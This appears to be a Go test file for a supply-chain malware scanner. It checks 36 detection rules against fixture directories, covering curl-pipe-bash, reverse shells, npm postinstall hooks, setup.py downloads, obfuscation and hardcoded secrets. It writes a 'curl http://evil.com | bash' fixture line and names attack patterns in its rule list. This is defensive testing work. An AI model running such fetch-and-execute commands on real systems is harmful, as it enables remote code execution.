package scan

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

// testdataDir returns the absolute path to the testdata directory.
func testdataDir(t *testing.T, subdir string) string {
	t.Helper()
	return filepath.Join("testdata", subdir)
}

// TestRuleRegistry_DefaultRegistry verifies all 25 embedded rules load correctly.
func TestRuleRegistry_DefaultRegistry(t *testing.T) {
	reg := DefaultRegistry()
	if got := reg.RuleCount(); got != 36 {
		t.Errorf("DefaultRegistry() has %d rules, want 36", got)
	}

	// Verify specific rule IDs exist
	wantIDs := map[string]bool{
		"generic-zero-width-unicode":  false,
		"generic-long-base64":         false,
		"generic-obfuscated-eval":     false,
		"generic-minified-require":    false,
		"generic-hex-encoded":         false,
		"generic-hardcoded-secret":    false,
		"generic-trojan-source":       false,
		"generic-gitattributes-filter": false,
		"generic-hidden-executable":   false,
		"shell-curl-pipe-bash":        false,
		"shell-base64-exec":           false,
		"shell-history-evasion":       false,
		"shell-reverse-shell":         false,
		"npm-postinstall-download":    false,
		"npm-postinstall-eval":        false,
		"npm-suspicious-script":       false,
		"npmrc-hook":                  false,
		"npm-git-dependency":          false,
		"npm-unpinned-dep":            false,
		"python-cmdclass":             false,
		"python-setup-download":       false,
		"python-build-backend":        false,
		"python-custom-index":         false,
		"python-git-dependency":       false,
		"python-dynamic-import":       false,
		"dockerfile-suspect":        false,
		"actions-suspect":           false,
		"known-malicious-npm":         false,
		"known-malicious-pypi":        false,
		"known-malicious-go":          false,
		"git-binary-in-source":        false,
		"git-env-in-history":          false,
		"git-large-recent-add":        false,
		"git-hook-suspicious":         false,
		"git-ignored-file-present":    false,
		"dockerignore-mismatch":       false,
	}

	for _, rule := range reg.Rules() {
		if _, ok := wantIDs[rule.ID()]; !ok {
			t.Errorf("unexpected rule ID: %s", rule.ID())
		}
		wantIDs[rule.ID()] = true

		// Verify each rule has required fields
		if rule.ID() == "" {
			t.Error("rule with empty ID")
		}
		if rule.Description() == "" {
			t.Errorf("rule %s has empty description", rule.ID())
		}
		if rule.Category() == "" {
			t.Errorf("rule %s has empty category", rule.ID())
		}
	}

	for id, found := range wantIDs {
		if !found {
			t.Errorf("missing rule: %s", id)
		}
	}
}

// TestShellCurlPipeBashRule detects curl | bash patterns.
func TestShellCurlPipeBashRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "shell-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "shell-curl-pipe-bash")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected findings in shell-malware, got 0")
	}

	// Should flag evil.sh (curl | bash) and reverse.sh (reverse shell)
	flagged := make(map[string]bool)
	for _, f := range findings {
		flagged[filepath.Base(f.File)] = true
	}
	if !flagged["evil.sh"] {
		t.Error("evil.sh not flagged for curl | bash")
	}
}

// TestShellReverseShellRule detects reverse shell patterns.
func TestShellReverseShellRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "shell-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "shell-reverse-shell")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected reverse shell findings, got 0")
	}

	flagged := make(map[string]bool)
	for _, f := range findings {
		flagged[filepath.Base(f.File)] = true
	}
	if !flagged["reverse.sh"] {
		t.Error("reverse.sh not flagged for reverse shell")
	}
}

// TestShellSafeFiles detects no false positives on clean files.
func TestShellSafeFiles(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "clean")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	// Run all shell rules
	for _, id := range []string{"shell-curl-pipe-bash", "shell-reverse-shell"} {
		rule := findRule(reg, id)
		findings, err := rule.Detect(ctx, target, files)
		if err != nil {
			t.Fatalf("rule %s Detect: %v", id, err)
		}
		if len(findings) > 0 {
			t.Errorf("rule %s found %d findings on clean dir, want 0", id, len(findings))
		}
	}
}

// TestNPMPostinstallDownload detects dangerous postinstall scripts.
func TestNPMPostinstallDownload(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "npm-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "npm-postinstall-download")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected postinstall download findings, got 0")
	}
}

// TestNPMPostinstallEval detects eval patterns in npm scripts.
func TestNPMPostinstallEval(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "npm-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "npm-postinstall-eval")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected postinstall eval findings, got 0")
	}
}

// TestNpmSuspiciousScript detects suspicious commands in any script.
func TestNpmSuspiciousScript(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "npm-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "npm-suspicious-script")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) < 2 {
		t.Fatalf("expected >=2 suspicious script findings (postinstall + deploy), got %d", len(findings))
	}
}

// TestNpmrcHook detects script hooks in .npmrc.
func TestNpmrcHook(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "npm-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "npmrc-hook")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected .npmrc hook findings, got 0")
	}
}

// TestPythonCmdclass detects cmdclass in setup.py.
func TestPythonCmdclass(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "python-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "python-cmdclass")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected cmdclass findings, got 0")
	}
}

// TestPythonSetupDownload detects network calls in setup.py.
func TestPythonSetupDownload(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "python-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "python-setup-download")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected setup.py network call findings, got 0")
	}
}

// TestPythonBuildBackend detects unusual build backends.
func TestPythonBuildBackend(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "python-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "python-build-backend")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected unusual build backend findings, got 0")
	}
}

// TestPythonCustomIndex detects custom pip indexes.
func TestPythonCustomIndex(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "python-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "python-custom-index")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected custom index findings, got 0")
	}
}

// TestGenericZeroWidthUnicode detects zero-width characters.
func TestGenericZeroWidthUnicode(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "obfuscation")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "generic-zero-width-unicode")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected zero-width unicode findings, got 0")
	}

	flagged := false
	for _, f := range findings {
		if filepath.Base(f.File) == "zero-width.js" {
			flagged = true
			break
		}
	}
	if !flagged {
		t.Error("zero-width.js not flagged for zero-width characters")
	}
}

// TestGenericLongBase64 detects long base64 strings.
func TestGenericLongBase64(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "obfuscation")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "generic-long-base64")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected long base64 findings, got 0")
	}
}

// TestGenericObfuscatedEval detects obfuscated eval/exec.
func TestGenericObfuscatedEval(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "obfuscation")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "generic-obfuscated-eval")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected obfuscated eval findings, got 0")
	}
}

// TestScannerIntegration runs the full scanner on malware fixtures.
func TestScannerIntegration(t *testing.T) {
	reg := DefaultRegistry()
	scanner := NewScanner(reg)
	ctx := context.Background()

	target := testdataDir(t, "shell-malware")
	opts := DefaultScanOptions(target)

	findings, err := scanner.Scan(ctx, opts)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}

	if findings.Count() == 0 {
		t.Fatal("expected findings from shell-malware scan, got 0")
	}

	// Verify no false positives on clean dir
	cleanTarget := testdataDir(t, "clean")
	cleanOpts := DefaultScanOptions(cleanTarget)
	cleanFindings, err := scanner.Scan(ctx, cleanOpts)
	if err != nil {
		t.Fatalf("Scan clean: %v", err)
	}
	if cleanFindings.Count() > 0 {
		t.Errorf("expected 0 findings on clean dir, got %d", cleanFindings.Count())
	}
}

// TestExclusions verifies that exclusions work correctly.
func TestExclusions(t *testing.T) {
	ex := NewExclusions(false)

	// Built-in excludes
	if !ex.ShouldExclude(".git") {
		t.Error(".git should be excluded")
	}
	if !ex.ShouldExclude("some/path/node_modules/pkg") {
		t.Error("node_modules should be excluded")
	}
	if !ex.ShouldExclude("project/.venv/lib") {
		t.Error(".venv should be excluded")
	}

	// Custom excludes
	ex.AddPattern("*.log")
	if !ex.ShouldExclude("server.log") {
		t.Error("*.log should be excluded")
	}

	// Strict mode only ignores user-added patterns, not built-in
	strictEx := NewExclusions(true)
	if strictEx.ShouldExclude("server.log") {
		t.Error("strict mode should ignore custom excludes")
	}
}

// TestFindingSeverity verifies severity comparisons and exit codes.
func TestFindingSeverity(t *testing.T) {
	findings := NewFindings()

	findings.Add(SeverityLow, "test", "test-rule", "file.go", 1, "low")
	findings.Add(SeverityCritical, "test", "test-rule", "file.go", 2, "critical")

	if findings.Count() != 2 {
		t.Errorf("expected 2 findings, got %d", findings.Count())
	}
	if findings.CountBySeverity(SeverityLow) != 1 {
		t.Errorf("expected 1 LOW, got %d", findings.CountBySeverity(SeverityLow))
	}
	if !findings.HasHighOrCritical() {
		t.Error("HasHighOrCritical should be true")
	}
	if findings.ExitCode() != 1 {
		t.Error("ExitCode should be 1 when HIGH/CRITICAL findings exist")
	}

	// Test without critical findings
	clean := NewFindings()
	clean.Add(SeverityLow, "test", "test-rule", "f.go", 1, "low")
	if clean.HasHighOrCritical() {
		t.Error("HasHighOrCritical should be false")
	}
	if clean.ExitCode() != 0 {
		t.Error("ExitCode should be 0")
	}
}

// TestIsTextFile checks binary detection.
func TestIsTextFile(t *testing.T) {
	if !IsTextFile(filepath.Join(testdataDir(t, "shell-malware"), "evil.sh")) {
		t.Error("evil.sh should be detected as text")
	}
	if IsTextFile("finding.go") {
		// finding.go is Go source, should be text
		if !IsTextFile("finding.go") {
			t.Error("finding.go should be text")
		}
	}
}

// TestGlobMatcher tests pattern matching utilities.
func TestGlobMatcher(t *testing.T) {
	if !HasExtension("test.sh", []string{".sh"}) {
		t.Error(".sh extension should match")
	}
	if HasExtension("test.sh", []string{".py"}) {
		t.Error(".py extension should not match .sh")
	}
	if !FilenameMatch(".gitattributes", []string{".gitattributes"}) {
		t.Error(".gitattributes should match")
	}
	if FilenameMatch("something-else", []string{".gitattributes"}) {
		t.Error("something-else should not match .gitattributes")
	}
}

// TestLoadEmbeddedRules verifies the embedded YAML loads correctly.
func TestLoadEmbeddedRules(t *testing.T) {
	configs, err := LoadEmbeddedRules()
	if err != nil {
		t.Fatalf("LoadEmbeddedRules: %v", err)
	}
	if len(configs) != 36 {
		t.Errorf("expected 36 embedded rules, got %d", len(configs))
	}

	// Verify every rule has required fields
	for _, cfg := range configs {
		if cfg.ID == "" {
			t.Error("rule with empty ID")
		}
		if !IsValidSeverity(cfg.Severity) {
			t.Errorf("rule %s has invalid severity: %s", cfg.ID, cfg.Severity)
		}
		if cfg.Detector == "" {
			t.Errorf("rule %s has empty detector", cfg.ID)
		}
	}
}

// TestNewRuleFromConfig verifies each detector type creates a valid rule.
func TestNewRuleFromConfig(t *testing.T) {
	configs, err := LoadEmbeddedRules()
	if err != nil {
		t.Fatalf("LoadEmbeddedRules: %v", err)
	}

	for _, cfg := range configs {
		rule := NewRuleFromConfig(cfg)
		if rule.ID() != cfg.ID {
			t.Errorf("rule ID mismatch: got %s, want %s", rule.ID(), cfg.ID)
		}
		if rule.Description() != cfg.Description {
			t.Errorf("rule %s description mismatch", cfg.ID)
		}
	}
}

// TestScannerFileDiscovery checks that files are discovered correctly.
func TestScannerFileDiscovery(t *testing.T) {
	target := testdataDir(t, "shell-malware")
	opts := DefaultScanOptions(target)

	files, err := discoverFiles(target, opts)
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	if len(files) == 0 {
		t.Fatal("expected files to be discovered")
	}

	// Should find all files in shell-malware
	want := map[string]bool{"evil.sh": false, "reverse.sh": false, "Makefile": false, "safe.sh": false, "base64-exec.sh": false, "history-evasion.sh": false}
	for _, f := range files {
		want[filepath.Base(f)] = true
	}
	for name, found := range want {
		if !found {
			t.Errorf("file not discovered: %s", name)
		}
	}
}

// TestSelfScanExclusions checks self-scan mode exclusions.
func TestSelfScanExclusions(t *testing.T) {
	ex := NewExclusions(false)
	ex.SetSelfScanExcludes([]string{"internal/scan/", "testdata/"})

	if !ex.ShouldExclude("internal/scan/rules_loader.go") {
		t.Error("self-scan should exclude internal/scan/")
	}
	if !ex.ShouldExclude("testdata/shell-malware/evil.sh") {
		t.Error("self-scan should exclude testdata/")
	}
}

// TestLoadIgnoreFile loads patterns from a .elencho-ignore file.
func TestLoadIgnoreFile(t *testing.T) {
	tmpDir := t.TempDir()
	ignorePath := filepath.Join(tmpDir, ".elencho-ignore")

	content := `# Elencho ignore file
*.log
build/
dist/
# This is a comment
temp-*
`
	if err := writeFile(ignorePath, content); err != nil {
		t.Fatalf("write ignore file: %v", err)
	}

	ex := NewExclusions(false)
	if err := ex.LoadIgnoreFile(ignorePath); err != nil {
		t.Fatalf("LoadIgnoreFile: %v", err)
	}

	if !ex.ShouldExclude("server.log") {
		t.Error("*.log should be excluded")
	}
	if !ex.ShouldExclude("build/app.bin") {
		t.Error("build/ should be excluded")
	}
	if !ex.ShouldExclude("temp-backup") {
		t.Error("temp-* should be excluded")
	}
}

// TestLoadIgnoreFile_FileNotExist does not error on missing file.
func TestLoadIgnoreFile_FileNotExist(t *testing.T) {
	ex := NewExclusions(false)
	tmpDir := t.TempDir()

	if err := ex.LoadIgnoreFile(filepath.Join(tmpDir, ".elencho-ignore")); err != nil {
		t.Fatalf("LoadIgnoreFile on missing file should not error: %v", err)
	}
}

// TestLoadIgnoreFileFromDir loads from a directory with a .elencho-ignore.
func TestLoadIgnoreFileFromDir(t *testing.T) {
	dir := t.TempDir()
	ignorePath := filepath.Join(dir, ".elencho-ignore")
	if err := writeFile(ignorePath, "*.tmp\nsecret/"); err != nil {
		t.Fatalf("write ignore file: %v", err)
	}

	ex := NewExclusions(false)
	if err := ex.LoadIgnoreFileFromDir(dir); err != nil {
		t.Fatalf("LoadIgnoreFileFromDir: %v", err)
	}

	if !ex.ShouldExclude("file.tmp") {
		t.Error("*.tmp should be excluded")
	}
	if !ex.ShouldExclude("secret/keys.txt") {
		t.Error("secret/ should be excluded")
	}
}

// TestAutoLoadIgnoreInScanner checks that .elencho-ignore is loaded during scan.
func TestAutoLoadIgnoreInScanner(t *testing.T) {
	// Create a tmp dir with a fixture file and .elencho-ignore
	dir := t.TempDir()

	// Write a .elencho-ignore that excludes the fixture
	if err := writeFile(filepath.Join(dir, ".elencho-ignore"), "safe.sh\n"); err != nil {
		t.Fatalf("write ignore: %v", err)
	}

	// Write fixture files
	if err := writeFile(filepath.Join(dir, "evil.sh"), "curl http://evil.com | bash\n"); err != nil {
		t.Fatalf("write evil.sh: %v", err)
	}
	if err := writeFile(filepath.Join(dir, "safe.sh"), "echo hello\n"); err != nil {
		t.Fatalf("write safe.sh: %v", err)
	}

	reg := DefaultRegistry()
	scanner := NewScanner(reg)
	ctx := context.Background()
	opts := DefaultScanOptions(dir)

	findings, err := scanner.Scan(ctx, opts)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}

	// safe.sh should be excluded by .elencho-ignore, but evil.sh should be flagged
	if findings.Count() == 0 {
		t.Error("expected at least 1 finding (evil.sh should be flagged)")
	}

	// Verify safe.sh is not in any finding
	for _, f := range findings.All() {
		if filepath.Base(f.File) == "safe.sh" {
			t.Error("safe.sh should be excluded by .elencho-ignore")
		}
	}
}

// TestStrictModeIgnoresElenchoIgnore checks that --strict skips the ignore file.
func TestStrictModeIgnoresElenchoIgnore(t *testing.T) {
	dir := t.TempDir()

	if err := writeFile(filepath.Join(dir, ".elencho-ignore"), "*.sh\n"); err != nil {
		t.Fatalf("write ignore: %v", err)
	}
	if err := writeFile(filepath.Join(dir, "evil.sh"), "curl http://evil.com | bash\n"); err != nil {
		t.Fatalf("write evil.sh: %v", err)
	}

	reg := DefaultRegistry()
	scanner := NewScanner(reg)
	ctx := context.Background()
	opts := DefaultScanOptions(dir)
	opts.StrictMode = true

	findings, err := scanner.Scan(ctx, opts)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}

	// In strict mode, evil.sh should still be flagged despite .elencho-ignore
	evilFlagged := false
	for _, f := range findings.All() {
		if filepath.Base(f.File) == "evil.sh" {
			evilFlagged = true
			break
		}
	}
	if !evilFlagged {
		t.Error("evil.sh should be flagged in strict mode despite .elencho-ignore")
	}
}

// TestHiddenExecutableRule checks detection of executables in hidden dirs.
func TestHiddenExecutableRule(t *testing.T) {
	rule := &GenericHiddenExecutableRule{
		BaseRule: BaseRule{RuleID: "generic-hidden-executable", Sev: SeverityMedium, Cat: "suspicious-file", Desc: "test"},
	}
	ctx := context.Background()

	// Simulate hidden executable files
	files := []string{
		".hidden/.trojan.exe",
		".cache/.evil.dll",
		"visible/ok.exe",   // not in hidden dir
		"normal.txt",       // not executable
	}

	findings, err := rule.Detect(ctx, "/tmp", files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	flagged := make(map[string]bool)
	for _, f := range findings {
		flagged[f.File] = true
	}

	if !flagged[".hidden/.trojan.exe"] {
		t.Error(".hidden/.trojan.exe should be flagged")
	}
	if flagged["visible/ok.exe"] {
		t.Error("visible/ok.exe should not be flagged (file name doesn't start with '.')")
	}
}

// TestHardcodedSecretRule checks credential detection.
func TestHardcodedSecretRule(t *testing.T) {
	ctx := context.Background()

	// Create a temp file with mock secrets (non-JSON format to match the regex)
	tmpDir := t.TempDir()
	secretFile := filepath.Join(tmpDir, "config.json")
	if err := writeFile(secretFile, `api_key = "sk-live-1234567890abcdef"`); err != nil {
		t.Fatalf("write secret file: %v", err)
	}

	files := []string{"config.json"}
	rule := &GenericHardcodedSecretRule{
		BaseRule: BaseRule{RuleID: "generic-hardcoded-secret", Sev: SeverityHigh, Cat: "secret-leak", Desc: "test"},
	}

	findings, err := rule.Detect(ctx, tmpDir, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}
	if len(findings) == 0 {
		t.Error("expected hardcoded secret finding")
	}
}

// TestGitAttributesRule checks .gitattributes filter detection.
func TestGitAttributesRule(t *testing.T) {
	ctx := context.Background()
	tmpDir := t.TempDir()

	gaContent := "*.js filter=myfilter\n*.css smudge=mysmudge\n"
	if err := writeFile(filepath.Join(tmpDir, ".gitattributes"), gaContent); err != nil {
		t.Fatalf("write gitattributes: %v", err)
	}

	files, err := discoverFiles(tmpDir, DefaultScanOptions(tmpDir))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := &GenericGitAttributesRule{
		BaseRule: BaseRule{RuleID: "generic-gitattributes-filter", Sev: SeverityHigh, Cat: "git-attributes", Desc: "test"},
	}

	findings, err := rule.Detect(ctx, tmpDir, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}
	if len(findings) == 0 {
		t.Error("expected gitattributes filter findings")
	}
}

// TestMinifiedRequireRule checks minified file detection.
func TestMinifiedRequireRule(t *testing.T) {
	ctx := context.Background()
	tmpDir := t.TempDir()

	// Minified file: < 5 lines, > 500 chars, contains require() that isn't a known package
	fakeContent := ""
	for i := 0; i < 700; i++ {
		fakeContent += "a"
	}
	fakeContent += ` require("./evil-module");`

	if err := writeFile(filepath.Join(tmpDir, "bundle.min.js"), fakeContent); err != nil {
		t.Fatalf("write file: %v", err)
	}

	files, err := discoverFiles(tmpDir, DefaultScanOptions(tmpDir))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := &GenericMinifiedRequireRule{
		BaseRule: BaseRule{RuleID: "generic-minified-require", Sev: SeverityMedium, Cat: "obfuscation", Desc: "test"},
	}

	findings, err := rule.Detect(ctx, tmpDir, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}
	if len(findings) == 0 {
		t.Error("expected minified require findings")
	}
}

// TestShellBase64ExecRule detects base64 decode piped to shell.
func TestShellBase64ExecRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "shell-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "shell-base64-exec")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected base64 exec findings, got 0")
	}

	flagged := false
	for _, f := range findings {
		if filepath.Base(f.File) == "base64-exec.sh" {
			flagged = true
			break
		}
	}
	if !flagged {
		t.Error("base64-exec.sh not flagged")
	}
}

// TestShellHistoryEvasionRule detects history clearing commands.
func TestShellHistoryEvasionRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "shell-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "shell-history-evasion")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected history evasion findings, got 0")
	}

	flagged := false
	for _, f := range findings {
		if filepath.Base(f.File) == "history-evasion.sh" {
			flagged = true
			break
		}
	}
	if !flagged {
		t.Error("history-evasion.sh not flagged")
	}
}

// TestPythonDynamicImportRule detects __import__ and importlib patterns.
func TestPythonDynamicImportRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "python-malware")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "python-dynamic-import")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected dynamic import findings, got 0")
	}

	flagged := false
	for _, f := range findings {
		if filepath.Base(f.File) == "dynamic-import.py" {
			flagged = true
			break
		}
	}
	if !flagged {
		t.Error("dynamic-import.py not flagged")
	}
}

// TestNpmUnpinnedDepRule detects unpinned dependency versions.
func TestNpmUnpinnedDepRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "npm-loose-deps")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "npm-unpinned-dep")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) != 3 {
		t.Fatalf("expected 3 unpinned deps (express:*, lodash:latest, eslint:*), got %d", len(findings))
	}
}

// TestGenericHexEncodedRule detects long hex payloads.
func TestGenericHexEncodedRule(t *testing.T) {
	reg := DefaultRegistry()
	ctx := context.Background()
	target := testdataDir(t, "obfuscation")

	files, err := discoverFiles(target, DefaultScanOptions(target))
	if err != nil {
		t.Fatalf("discoverFiles: %v", err)
	}

	rule := findRule(reg, "generic-hex-encoded")
	findings, err := rule.Detect(ctx, target, files)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected hex encoded findings, got 0")
	}

	flagged := false
	for _, f := range findings {
		if filepath.Base(f.File) == "hex-encoded.py" {
			flagged = true
			break
		}
	}
	if !flagged {
		t.Error("hex-encoded.py not flagged")
	}
}

// TestScannerWithVariousDirs tests scanning with different directory configurations.
func TestScannerWithVariousDirs(t *testing.T) {
	reg := DefaultRegistry()
	scanner := NewScanner(reg)
	ctx := context.Background()

	tests := []struct {
		name    string
		target  string
		wantMin int // minimum findings expected
		wantMax int // maximum findings expected (use -1 for no limit)
	}{
		{"shell-malware", testdataDir(t, "shell-malware"), 4, -1},
		{"npm-malware", testdataDir(t, "npm-malware"), 4, -1},
		{"npm-loose-deps", testdataDir(t, "npm-loose-deps"), 2, -1},
		{"python-malware", testdataDir(t, "python-malware"), 4, -1},
		{"obfuscation", testdataDir(t, "obfuscation"), 3, -1},
		{"clean", testdataDir(t, "clean"), 0, 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			opts := DefaultScanOptions(tt.target)
			findings, err := scanner.Scan(ctx, opts)
			if err != nil {
				t.Fatalf("Scan: %v", err)
			}

			if findings.Count() < tt.wantMin {
				t.Errorf("got %d findings, want at least %d", findings.Count(), tt.wantMin)
			}
			if tt.wantMax >= 0 && findings.Count() > tt.wantMax {
				t.Errorf("got %d findings, want at most %d", findings.Count(), tt.wantMax)
			}
		})
	}
}

// TestFindingString verifies the String() method doesn't panic.
func TestFindingString(t *testing.T) {
	f := &Finding{
		Severity: SeverityCritical,
		Category: "test",
		RuleID:   "test-rule",
		File:     "test.go",
		Line:     42,
		Message:  "test message",
	}

	s := f.String()
	if s == "" {
		t.Error("String() should not be empty")
	}

	findings := NewFindings()
	findings.Add(SeverityLow, "cat", "rule", "f.go", 1, "msg")
	s2 := findings.String()
	if s2 == "" {
		t.Error("Findings.String() should not be empty")
	}
}

// TestSeverityValidation checks severity parsing.
func TestSeverityValidation(t *testing.T) {
	if !IsValidSeverity("LOW") {
		t.Error("LOW should be valid")
	}
	if !IsValidSeverity("HIGH") {
		t.Error("HIGH should be valid")
	}
	if !IsValidSeverity("CRITICAL") {
		t.Error("CRITICAL should be valid")
	}
	if !IsValidSeverity("MEDIUM") {
		t.Error("MEDIUM should be valid")
	}
	if IsValidSeverity("INVALID") {
		t.Error("INVALID should not be valid")
	}
}

// writeFile is a test helper that writes content to a file.
func writeFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0644)
}

// findRule locates a rule by ID in the registry.
func findRule(reg *RuleRegistry, id string) Rule {
	for _, r := range reg.Rules() {
		if r.ID() == id {
			return r
		}
	}
	panic("rule not found: " + id)
}
